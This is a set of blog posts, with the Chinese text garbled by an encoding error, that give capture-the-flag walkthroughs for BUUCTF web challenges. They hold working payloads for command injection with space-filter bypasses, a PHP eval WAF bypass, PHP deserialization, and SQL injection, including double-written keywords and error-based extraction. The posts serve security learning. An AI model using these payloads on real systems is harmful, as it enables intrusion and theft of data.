  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/02/04/buu-web%E9%9B%B6%E7%A2%8E1.0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="å…­å…¬å­ä¹°å•">
      <meta itemprop="description" content="ä¸€å¤´åŠªåŠ›çš„èœé¸Ÿ">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tube.D@q1an9">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/02/04/buu-web%E9%9B%B6%E7%A2%8E1.0/" class="post-title-link" itemprop="url">buu-webé›¶ç¢1.0</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-02-04 15:55:09" itemprop="dateCreated datePublished" datetime="2021-02-04T15:55:09+08:00">2021-02-04</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-03-06 19:22:52" itemprop="dateModified" datetime="2021-03-06T19:22:52+08:00">2021-03-06</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>è€ƒå¯Ÿå‘½ä»¤æ‰§è¡Œæ¼æ´ç»•è¿‡<br>ï¼Ÿip=127.0.0.1|ls çœ‹å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶<br>ï¼Ÿip=127.0.0.1|cat index.php çœ‹index.phpæ–‡ä»¶  </p>
<p>å‘ç°ç©ºæ ¼è¢«è¿‡æ»¤ ç»•è¿‡ç©ºæ ¼çš„æ–¹æ³•å¦‚ä¸‹ï¼š<br>$IFS<br>${IFS}<br>$IFS$æ•°å­—<br>&lt;<br>&lt;&gt;<br>{cat,flag.php}<br>ç»è¿‡å°è¯•ï¼Œå‘ç°ç¬¬ä¸‰ä¸ªæ²¡è¢«è¿‡æ»¤æ‰<br>ï¼Ÿip=127.0.0.1|cat$IFS$6index.php å¯æŸ¥çœ‹æ–‡ä»¶</p>
<h2 id="index-phpæ–‡ä»¶å¦‚ä¸‹"><a href="#index-phpæ–‡ä»¶å¦‚ä¸‹" class="headerlink" title="index.phpæ–‡ä»¶å¦‚ä¸‹"></a>index.phpæ–‡ä»¶å¦‚ä¸‹</h2><pre><code>|\&#39;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;
echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);
die(&quot;fxck your symbol!&quot;);
 &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;
die(&quot;fxck your space!&quot;);
 &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;
die(&quot;fxck your bash!&quot;);
&#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;
die(&quot;fxck your flag!&quot;);
 &#125;
 $a = shell_exec(&quot;ping -c 4 &quot;.$ip);
 echo &quot;

&quot;;
 print_r($a);
&#125;  </code></pre>
<p>å‘ç°index.phpä¸­è¿‡æ»¤äº†å¾ˆå¤šå­—ç¬¦ï¼Œè¿‡æ»¤äº†bashå‘½ä»¤ï¼Œflagå­—ç¬¦ä¸²ï¼Œè¿˜æœ‰ä¸€ç³»åˆ—çš„ç¬¦å·ï¼Œè™½ç„¶è¿‡æ»¤äº†bashå‘½ä»¤æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨shã€‚shçš„è„šæœ¬åŸºæœ¬ä¸Šéƒ½å¯ä»¥åœ¨bashä¸‹è¿è¡Œã€‚<br>ç°åœ¨è®¿é—®flag.php</p>
<h3 id="sh"><a href="#sh" class="headerlink" title="sh"></a>sh</h3><p>payload:<br>?ip=127.0.0.1;echo$IFS$6Y2F0IGZsYWcucGhw|base64$IFS$6-d|sh<br>(å°†â€œcat flag.phpâ€ç»base64è½¬ç å¾—åˆ°)</p>
<h3 id="å˜é‡æ‹¼æ¥"><a href="#å˜é‡æ‹¼æ¥" class="headerlink" title="å˜é‡æ‹¼æ¥"></a>å˜é‡æ‹¼æ¥</h3><p>index.phpä»£ç æœ‰ä¸€ä¸ªå˜é‡a,å¯ä»¥ç”¨å˜é‡aä»£æ›¿è¢«è¿‡æ»¤çš„flagä¸­çš„æŸä¸ªå­—ç¬¦ï¼Œä»è€Œç»•è¿‡flagè¿‡æ»¤ï¼Œè¿›è€Œè¯»å–flag<br>/?ip=127.0.0.1;a=g;cat$IFS$2fla$a.php</p>
<h3 id="å†…è”æ³¨é‡Š"><a href="#å†…è”æ³¨é‡Š" class="headerlink" title="å†…è”æ³¨é‡Š"></a>å†…è”æ³¨é‡Š</h3><p>/?ip=127.0.0.1;cat$IFS$2<code>ls</code><br>å°†åå¼•å·å†…å‘½ä»¤çš„è¾“å‡ºç»“æœä½œä¸ºè¾“å…¥æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œè¿™æ ·flag.phpå’Œindex.phpçš„ç»“æœéƒ½èƒ½ç›´æ¥æŸ¥çœ‹  </p>
<hr>
<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>æŸ¥çœ‹æºç ï¼Œè¯´æœ‰WAFï¼Œçœ‹åˆ°æç¤ºæœ‰ä¸€ä¸ªcalc.phpæ–‡ä»¶ï¼Œè®¿é—®<br>è®¿é—®ç»“æœï¼Œä¼ å‚ä¸ºnumï¼Œå¹¶ä¸”æœ‰é»‘åå•ï¼Œè¿‡æ»¤äº†å­—æ¯tï¼Œrï¼Œ[ï¼Œ]ç­‰ï¼ŒåŸºæœ¬ä¸Šä¸€å¥è¯æ˜¯ä¸ç®¡ç”¨ã€‚<br>æœ‰eval()å‡½æ•°ï¼Œè¯´ä¸å®šæœ‰ä»£ç æ‰§è¡Œæ¼æ´ï¼ševal()ä»£ç æ‰§è¡Œæ¼æ´ï¼Œ1,2<br>numä¼ å‚æµ‹è¯•ï¼š ï¼Ÿnum=123123,å¯æ˜¾ï¼Œæ•°å­—å¯æ˜¾ï¼Œå­—æ¯ä¸å¯æ˜¾ å­—æ¯éƒ½è¢«WAFæ‹¦æˆªï¼Œåˆ©ç”¨PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§ç»•è¿‡wafï¼ŒPHPå­—ç¬¦ä¸²è§£æç‰¹æ€§ã€‚<br><u>ç”±äºphpåœ¨è§£æurlä¸­çš„å‚æ•°æ—¶ï¼Œä¿å­˜å‰ä¼šæŠŠnumå‰é¢çš„ç©ºæ ¼å»æ‰å†è§£æï¼Œæ‰€ä»¥åœ¨numå‰åŠ ç©ºæ ¼å¯ç»•è¿‡WAF</u>ï¼Œåœ¨numå‰åŠ ä¸ªç©ºæ ¼ï¼Œå¼¹å‡ºä¹‹å‰ä»£ç ä¸­çš„æç¤ºï¼Œåªè¦åœ¨é»‘åå•ä¸­ï¼Œéƒ½ä¼šæç¤ºwhat are you want to do?<br>å¯ä»¥æŸ¥phpinfo()<br>payload:      ? num=phpinfo()<br>PHPå‡½æ•°ï¼š<br>scandir()ï¼šä»¥æ•°ç»„å½¢å¼è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•<br>var_dump()ï¼šè¾“å‡ºå˜é‡çš„ç›¸å…³ä¿¡æ¯ã€‚<br>var_dump()ï¼šæ˜¾ç¤ºå…³äºä¸€ä¸ªæˆ–å¤šä¸ªè¡¨è¾¾å¼çš„ç»“æ„ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¡¨è¾¾å¼çš„ç±»å‹ä¸å€¼ã€‚æ•°ç»„å°†é€’å½’å±•å¼€å€¼ï¼Œé€šè¿‡ç¼©è¿›æ˜¾ç¤ºå…¶ç»“æ„ã€‚<br>file_get_contents()ï¼šæŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ã€‚  </p>
<ul>
<li>var_dump(scandir(chr(47))): æŸ¥çœ‹æ–‡ä»¶ç›®å½•ï¼ˆâ€œ/â€è¢«è¿‡æ»¤äº†ï¼Œå¯ä»¥ä½¿ç”¨chr(47)æ¥è¿›è¡Œè¡¨ç¤ºï¼Œè¿›è¡Œç›®å½•è¯»å–ï¼‰</li>
<li>?%20num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))  è¯»å–flag  </li>
</ul>
<hr>
<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-PHP"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-PHP" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP</h2><p>åç¼€ <a target="_blank" rel="noopener" href="http://www.zipæ‰¾åˆ°å¤‡ä»½æ–‡ä»¶/">www.zipæ‰¾åˆ°å¤‡ä»½æ–‡ä»¶</a>  </p>
<hr>
<pre><code>&lt;?php
include &#39;class.php&#39;;
$select = $_GET[&#39;select&#39;];
$res=unserialize(@$select);
?&gt;</code></pre>
<hr>
<pre><code>&lt;?php
include &#39;flag.php&#39;;

error_reporting(0);


class Name&#123;
private $username = &#39;nonono&#39;;
private $password = &#39;yesyes&#39;;

public function __construct($username,$password)&#123;
    $this-&gt;username = $username;
    $this-&gt;password = $password;
&#125;

function __wakeup()&#123;
    $this-&gt;username = &#39;guest&#39;;
&#125;

function __destruct()&#123;
    if ($this-&gt;password != 100) &#123;
        echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;
        echo &quot;You name is: &quot;;
        echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;
        echo &quot;You password is: &quot;;
        echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;
        die();
    &#125;
    if ($this-&gt;username === &#39;admin&#39;) &#123;
        global $flag;
        echo $flag;
    &#125;else&#123;
        echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#39;t give you the flag!&quot;;
        die();

    &#125;
&#125;
&#125;
?&gt;  </code></pre>
<p>çœ‹äº†ä»£ç æ²¡å•¥å¤´ç»ªï¼Œçœ‹å¤§ä½¬ä»¬çš„wpï¼Œè¿™ä¸ªé¢˜è€ƒå¯Ÿååºåˆ—åŒ–<br>åºåˆ—åŒ–ï¼ˆserializationï¼‰åœ¨è®¡ç®—æœºç§‘å­¦çš„æ•°æ®å¤„ç†ä¸­ï¼Œæ˜¯æŒ‡å°†æ•°æ®ç»“æ„æˆ–å¯¹è±¡çŠ¶æ€è½¬æ¢æˆå¯å–ç”¨æ ¼å¼ï¼ˆä¾‹å¦‚å­˜æˆæ–‡ä»¶ï¼Œå­˜äºç¼“å†²ï¼Œæˆ–ç»ç”±ç½‘ç»œä¸­å‘é€ï¼‰ï¼Œä»¥ç•™å¾…åç»­åœ¨ç›¸åŒæˆ–å¦ä¸€å°è®¡ç®—æœºç¯å¢ƒä¸­ï¼Œèƒ½æ¢å¤åŸå…ˆçŠ¶æ€çš„è¿‡ç¨‹ã€‚</p>
<p>æ¦‚å¿µå¾ˆå®¹æ˜“ç†è§£ï¼Œå…¶å®å°±æ˜¯å°†æ•°æ®è½¬åŒ–æˆä¸€ç§å¯é€†çš„æ•°æ®ç»“æ„ï¼Œè‡ªç„¶ï¼Œé€†å‘çš„è¿‡ç¨‹å°±å«åšååºåˆ—åŒ–ã€‚<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/v1040375575/article/details/111646602?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=%20%20%20%20%20$res=unserialize">https://blog.csdn.net/v1040375575/article/details/111646602?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=%20%20%20%20%20$res=unserialize</a>  </p>
<p>  å¯¹ä¼ å…¥çš„selectååºåˆ—åŒ–åæ»¡è¶³ password = 100 å’Œusername === â€˜adminâ€™<br>ç„¶åæ„é€ ååºåˆ—åŒ–ï¼š<br>Oæ˜¯å¯¹è±¡ï¼Œsæ˜¯å­—ç¬¦ä¸²ï¼Œiæ˜¯æ•°å­—,è„šæœ¬ï¼š</p>
<pre><code>&lt;?php
class Name&#123;
    private $username = &#39;nonono&#39;;
    private $password = &#39;yesyes&#39;;
    public function __construct($username,$password)&#123;
        $this-&gt;username = $username;
        $this-&gt;password = $password;
    &#125;
    public function __wakeup()&#123;
        $this-&gt;username = &quot;guests&quot;;
    &#125;
    public function fun()&#123;
        echo $this-&gt;username;echo &quot;&lt;br&gt;&quot;;echo $this-&gt;password;
    &#125;
&#125;
$a = serialize(new Name(&quot;admin&quot;,100));
echo $a;
?&gt;</code></pre>
<p>å› ä¸ºæ˜¯privateä¿®é¥°çš„æ‰€ä»¥è¦åŠ %00å……å½“ç©ºæ ¼  </p>
<pre><code>O:4:&quot;Name&quot;:2:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</code></pre>
<p>payloadï¼š</p>
<pre><code>url+?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</code></pre>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/02/02/Node-js%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="å…­å…¬å­ä¹°å•">
      <meta itemprop="description" content="ä¸€å¤´åŠªåŠ›çš„èœé¸Ÿ">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tube.D@q1an9">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/02/02/Node-js%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-title-link" itemprop="url">Node.jså­¦ä¹ ç¬”è®°</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-02-02 15:35:04" itemprop="dateCreated datePublished" datetime="2021-02-02T15:35:04+08:00">2021-02-02</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-02-03 10:31:39" itemprop="dateModified" datetime="2021-02-03T10:31:39+08:00">2021-02-03</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>ä»Šå¤©è‡ªå­¦node.jsï¼Œå…ˆåº·åº·ã€Šèœé¸Ÿç¬”è®°ã€‹ã€‚ä»ã€Šèœé¸Ÿç¬”è®°ã€‹ä¸­å­¦ä¹ ï¼Œç„¶åå†™ä¸€äº›æ„Ÿæ‚Ÿå’Œè‡ªå·±çš„çœ‹æ³•ã€‚<br>å†²å†²å†²ï¼</p>
<h2 id="Node-jsåˆ›å»ºç¬¬ä¸€ä¸ªåº”ç”¨"><a href="#Node-jsåˆ›å»ºç¬¬ä¸€ä¸ªåº”ç”¨" class="headerlink" title="Node.jsåˆ›å»ºç¬¬ä¸€ä¸ªåº”ç”¨"></a>Node.jsåˆ›å»ºç¬¬ä¸€ä¸ªåº”ç”¨</h2><p><img src="images/nodejs1.0.png" alt="nodejs1.0"><br>è¯´node.jså¯ä»¥å®Œæˆåç«¯ä»£ç çš„ä¸€æ¡é¾™æœåŠ¡     </p>
<h3 id="åˆ›å»ºåº”ç”¨çš„å…·ä½“æ­¥éª¤"><a href="#åˆ›å»ºåº”ç”¨çš„å…·ä½“æ­¥éª¤" class="headerlink" title="åˆ›å»ºåº”ç”¨çš„å…·ä½“æ­¥éª¤"></a>åˆ›å»ºåº”ç”¨çš„å…·ä½“æ­¥éª¤</h3><p><a target="_blank" rel="noopener" href="https://www.runoob.com/nodejs/nodejs-http-server.html">https://www.runoob.com/nodejs/nodejs-http-server.html</a><br>å…·ä½“æ“ä½œï¼šå¯è¡Œ</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/02/01/SQL%E6%B3%A8%E5%85%A5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="å…­å…¬å­ä¹°å•">
      <meta itemprop="description" content="ä¸€å¤´åŠªåŠ›çš„èœé¸Ÿ">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tube.D@q1an9">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/02/01/SQL%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">SQLæ³¨å…¥</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-02-01 17:54:11" itemprop="dateCreated datePublished" datetime="2021-02-01T17:54:11+08:00">2021-02-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-02-18 18:00:25" itemprop="dateModified" datetime="2021-02-18T18:00:25+08:00">2021-02-18</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="1-buu-SUCTF-2019-EasySQL"><a href="#1-buu-SUCTF-2019-EasySQL" class="headerlink" title="1.buu-[SUCTF 2019]EasySQL"></a>1.buu-[SUCTF 2019]EasySQL</h1><p><img src="images/buusql1.0.png" alt="buu-sql.png"><br>å‘ç°æ˜¨å¤©ç”¨çš„å †å æ³¨å…¥å¯ä»¥ç›´æ¥æŸ¥è¡¨<br><img src="images/buusql1.0.png" alt="buu-sql.png"><br>å‘ç°äº†è¡¨Flag,ä½†æ˜¯æ— æ³•ç”¨show columns from Flagè¯»å–å…¶ä¸­çš„åˆ—<br>å¥½ï¼Œçœ‹çœ‹å¤§ä½¬ä»¬çš„WPï¼šâ€œåç«¯æ—¢ç„¶èƒ½åšåˆ°æ•°å­—å›æ˜¾å­—æ¯ä¸å›æ˜¾ï¼Œè¯´æ˜æœ‰ä¸€ä¸ª æˆ– ç»“æ„ï¼Œè€Œä¸”ä¸ç›´æ¥å›æ˜¾flagï¼Œä½†ä½œä¸ºä¸€é“é¢˜ç›®ï¼Œfromä¸€å®šæ˜¯from flagâ€çŒœå‡ºåç«¯æºç select $_POST[â€˜queryâ€™] || flag from Flag,<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/stevenonesir/article/details/110203051?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=%5BSUCTF%202019%5DEasySQL&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-110203051.pc_search_result_hbase_insert&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/stevenonesir/article/details/110203051?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=%5BSUCTF%202019%5DEasySQL&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-110203051.pc_search_result_hbase_insert&amp;spm=1018.2226.3001.4187</a><br>æŒºæ— è¯­çš„ï¼Œç›´æ¥çœ‹å¤§ä½¬è®²è§£å§<br>ä»Šå¤©å…ˆæåˆ«çš„        </p>
<hr>
<h1 id="buu-æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL"><a href="#buu-æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL" class="headerlink" title="buu-[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL"></a>buu-[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL</h1><p>è¿›å…¥é¶æœº<br><img src="images/buusql2.0.png" alt="buu-sql.png"><br>ç”¨ä¸‡èƒ½å¯†ç è¯•ä¸€è¯•<br><img src="images/buusql2.1.png" alt="buu-sql.png"><br>ç”¨æˆ·åå’Œå¯†ç éƒ½è¾“å…¥   adminâ€™ or â€˜1â€™=â€™1<br>å¾—åˆ°flag     </p>
<h1 id="æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL</h1><h1 id="æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL</h1><p>å…ˆå°è¯•ä¸‡èƒ½å¯†ç ç™»å½•ï¼Œæœ€åå‘ç°<br>?username=adminâ€™â€“+&amp;password=1ç™»é™†æˆåŠŸ  </p>
<ul>
<li>æŸ¥å­—æ®µ<br>?username=adminâ€™ order by 3â€“+&amp;password=1<br>æŠ¥é”™ï¼š<br>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near â€˜der 3â€“ â€˜ and password=â€™1â€™â€™ at line 1ï¼Œå‘ç°è¯­å¥ä¸­order by å°±å‰©deräº†ï¼Œè¯´æ˜è¿‡æ»¤äº†orå’Œby,<br>åŒå†™ç»•è¿‡ï¼š?username=adminâ€™ oorrder bbyy 4â€“+&amp;password=1</li>
<li>æŸ¥å¾—æœ‰3ä¸ªå­—æ®µï¼Œå¼€å§‹è”åˆæŸ¥è¯¢<br>?username=-adminâ€™ union select 1,2,3â€“+&amp;password=1æ‰¾å›æ˜¾ï¼Œ<br>åˆæœ‰æŠ¥é”™ï¼šcheck the manual that corresponds to your MariaDB server version for the right syntax to use near â€˜1,2,3â€“ â€˜ and password=â€™1â€™â€™ at line 1<br>è¿‡æ»¤äº†union å’Œ selectï¼Œå†åŒå†™ç»•è¿‡ï¼š<br>?username=-adminâ€™ ununionion seselectlect 1,2,3â€“+&amp;password=1æœ‰å›æ˜¾  </li>
<li>æŸ¥å½“å‰æ•°æ®åº“ä¸ºgeek,æŸ¥è¯¥æ•°æ®åº“çš„è¡¨ï¼š<br>?username=-adminâ€™ ununionion seselectlect 1,2,group_concat(table_name) from information_schema.tables where table_schema=â€™geekâ€™â€“+&amp;password=1ï¼Œæœ‰æŠ¥é”™ï¼š<br>check the manual that corresponds to your MariaDB server version for the right syntax to use near â€˜.tables table_schema=â€™geekâ€™â€“ â€˜ and password=â€™1â€™â€™ at line 1<br>è¿‡æ»¤äº†fromå’Œwhereï¼Œç»§ç»­åŒå†™ç»•è¿‡<br>ç»“æœï¼šTable â€˜infmation_schema.tablesâ€™ doesnâ€™t existï¼Œ<br>å§æ§½ï¼Œå°ç»†èŠ‚å•Šï¼Œä¸Šé¢è¿‡æ»¤äº†orï¼Œæ‰€ä»¥informationé‡Œé¢çš„orä¹Ÿè¦åŒå†™<br>ï¼ˆæŸ¥æ‰€æœ‰æ•°æ®åº“ï¼ŒæŸ¥ctfé‡Œé¢çš„è¡¨ï¼ŒæŸ¥Flagé‡Œé¢çš„åˆ—ï¼ŒæŸ¥flagé‡Œé¢çš„å­—æ®µï¼‰</li>
</ul>
<hr>
<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL</h2><p>æŠ¥é”™æ³¨å…¥ï¼š  ï¼ˆè¿‡æ»¤äº†ç©ºæ ¼ï¼Œç”¨æ‹¬å·ä»£æ›¿ï¼‰<br>æŸ¥æ•°æ®åº“</p>
<pre><code>/check.php?username=admin&amp;password=admin&#39;^extractvalue(1,concat(0x7e,(select(database()))))%23</code></pre>
<p>æŸ¥è¡¨</p>
<pre><code>/check.php?username=admin&amp;password=admin&#39;^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(&#39;geek&#39;)))))%23</code></pre>
<p>æŸ¥å­—æ®µ</p>
<pre><code>/check.php?username=admin&amp;password=admin&#39;^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like(&#39;H4rDsq1&#39;)))))%23</code></pre>
<p>æŸ¥æ•°æ®password</p>
<pre><code>/check.php?username=admin&amp;password=admin&#39;^extractvalue(1,concat(0x7e,(select(password)from(geek.H4rDsq1))))%23</code></pre>
<p>å‘ç°åªçˆ†ä¸€åŠ</p>
<pre><code>/check.php?username=admin&amp;password=admin%27^extractvalue(1,concat(0x7e,(select(left(password,30))from(geek.H4rDsq1))))%23</code></pre>
<p>left rightæŸ¥å·¦å³</p>
<h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>BPæŠ“åŒ…fuzzï¼Œå‘ç°è¿‡æ»¤äº†or xor = ç­‰ï¼Œ<br>æ²¡è¿‡æ»¤union selectï¼Œå¯ä»¥æŸ¥</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/02/01/buu-Secretfile/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="å…­å…¬å­ä¹°å•">
      <meta itemprop="description" content="ä¸€å¤´åŠªåŠ›çš„èœé¸Ÿ">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tube.D@q1an9">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/02/01/buu-Secretfile/" class="post-title-link" itemprop="url">buu-Secretfile</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-02-01 17:05:26" itemprop="dateCreated datePublished" datetime="2021-02-01T17:05:26+08:00">2021-02-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-02-03 11:40:45" itemprop="dateModified" datetime="2021-02-03T11:40:45+08:00">2021-02-03</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="buu-web-æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File"><a href="#buu-web-æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File" class="headerlink" title="buu-web-[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File"></a>buu-web-[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File</h2><p><img src="images/buu2.1.0.png" alt="1"><br>æ‰“å¼€ä¸€çœ‹ï¼Œç”»é£æ¯”è¾ƒè¯¡å¼‚<br><img src="images/buu2.1.1.png" alt="2"><br>ä¹Ÿçœ‹ä¸å‡ºå•¥ä¸œè¥¿æ¥ï¼Œçœ‹çœ‹æºç <br><img src="images/buu2.1.2.png" alt="1"><br>å‘ç°äº†ä¸€ä¸ªå¸¦phpåç¼€çš„é“¾æ¥ï¼Œæ‰“å¼€<br><img src="images/buu2.1.3.png" alt="1"><br>æœ‰ç§˜å¯†ï¼Œç‚¹å‡»ï¼Œå‘ç°åˆ°äº†ç»ˆç‚¹ï¼Œä¸”æç¤ºâ€œå›å»çœ‹çœ‹â€<br><img src="images/buu2.1.4.png" alt="1"><br>æé†’æŠ“åŒ…ï¼ŒæŠ“åŒ…è¯•è¯•<br><img src="images/buu2.1.5.png" alt="1"><br>åˆå¾—åˆ°ä¸€ä¸ªé“¾æ¥<br><img src="images/buu2.1.6.png" alt="1"><br>ç»™äº†ä»£ç 